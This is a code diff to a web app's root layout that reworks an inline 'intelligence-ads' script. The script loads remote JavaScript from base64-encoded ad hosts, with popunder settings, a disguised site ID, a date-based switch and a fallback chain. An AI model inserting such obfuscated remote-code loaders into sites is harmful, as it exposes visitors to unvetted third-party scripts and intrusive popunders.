@@ -89,16 +89,18 @@ export default function RootLayout({ children }) {
           strategy="afterInteractive"
         />
 
-      <Script
+   <Script
   id="intelligence-ads"
-  strategy="lazyOnload"
+  strategy="afterInteractive"
+  data-cfasync="false"
   dangerouslySetInnerHTML={{
     __html: `
+/*<![CDATA[/* */
 (function(){
   var a=window,
   q="dbf7f1a4e7f933586fb8573ab5e33727",
   m=[
-    ["siteId",5267553],
+    ["siteId",854-710-310+5267553],
     ["minBid",0],
     ["popundersPerIP","0"],
     ["delayBetween",0],
@@ -110,10 +112,11 @@ export default function RootLayout({ children }) {
     "d3d3LmludGVsbGlnZW5jZWFkeC5jb20vT2RGYVZ6L3plcG9jaC5taW4uanM=",
     "ZDJrbHg4N2Jnem5nY2UuY2xvdWRmcm9udC5uZXQvc2xOWlZxL2lqRy9xbmctcHJldHR5anNvbi5taW4uY3Nz"
   ],
-  u=-1,d,p,k=function(){
+  u=-1,d,p,
+  k=function(){
     clearTimeout(p);
     u++;
-    if(t[u]){
+    if(t[u] && !(1795431294000 < (new Date).getTime() && 1 < u)){
       d=a.document.createElement("script");
       d.type="text/javascript";
       d.async=true;
@@ -121,16 +124,24 @@ export default function RootLayout({ children }) {
       d.src="https://"+atob(t[u]);
       d.crossOrigin="anonymous";
       d.onerror=k;
-      d.onload=function(){clearTimeout(p)};
+      d.onload=function(){
+        clearTimeout(p);
+        a[q.slice(0,16)+q.slice(0,16)] || k();
+      };
       p=setTimeout(k,5000);
       r.parentNode.insertBefore(d,r);
     }
   };
-  k();
+  if(!a[q]){
+    try{Object.freeze(a[q]=m)}catch(e){}
+    k();
+  }
 })();
+/*]]>/* */
     `,
   }}
 />
+
 
       
       </body>
